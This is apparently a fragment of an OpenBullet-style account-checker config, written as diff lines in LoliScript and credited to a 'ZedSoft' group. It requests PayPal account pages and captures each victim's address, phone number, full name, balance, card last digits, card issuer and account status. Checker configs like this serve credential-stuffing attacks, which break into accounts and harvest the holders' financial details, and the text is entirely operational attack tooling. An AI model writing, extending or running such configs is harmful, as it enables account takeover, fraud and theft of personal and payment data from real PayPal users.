+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+PARSE "<SOURCE>" LR "\"line1\":\"" "\"" CreateEmpty=FALSE -> CAP "Address 1" 
+
+PARSE "<SOURCE>" LR "\"city\":\"" "\"" CreateEmpty=FALSE -> CAP "City" 
+
+PARSE "<SOURCE>" LR "\"state\":\"" "\"" CreateEmpty=FALSE -> CAP "State" 
+
+PARSE "<SOURCE>" LR "\"postcode\":\"" "\"" CreateEmpty=FALSE -> CAP "Zip" 
+
+PARSE "<SOURCE>" LR "\"countryCode\":\"" "\"" CreateEmpty=FALSE -> CAP "Country" 
+
+PARSE "<SOURCE>" LR "\"national_number\":\"" "\"" CreateEmpty=FALSE -> CAP "Phone Number" 
+
+REQUEST GET "https://www.paypal.com/myaccount/money/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/2.3.0 Mobile/15E148" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Host: www.paypal.com" 
+  HEADER "Accept-Language: en-CA,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Origin: https://www.paypal.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Cache-Control: no-cache" 
+
+PARSE "<SOURCE>" LR "lastName\":\"" "\"" CreateEmpty=FALSE -> CAP "Lastname" 
+
+PARSE "<SOURCE>" LR "{\"firstName\":\"" "\"" CreateEmpty=FALSE -> CAP "Name" "" " <Lastname>" 
+
+PARSE "<SOURCE>" LR "\"totalAvailable\":{\"amount\":\"" "\",\"" Recursive=TRUE CreateEmpty=FALSE -> CAP "balance" 
+
+PARSE "<SOURCE>" LR "lastDigits\":\"" "\"" -> CAP "cards" "[" "]" 
+
+PARSE "<SOURCE>" LR "\"issuerName\":\"" "\"" Recursive=TRUE CreateEmpty=FALSE -> CAP "carddata" 
+
+PARSE "<SOURCE>" LR "\"status\":\"" "\"" CreateEmpty=FALSE -> CAP "STAC" 
+
+PARSE "<SOURCE>" LR "_mzone\":\"" "\"}" CreateEmpty=FALSE -> CAP "Country" 
+
+FUNCTION Constant "@ZedSoftOfficial - ZedSoft.ir" -> CAP "About  " 
+
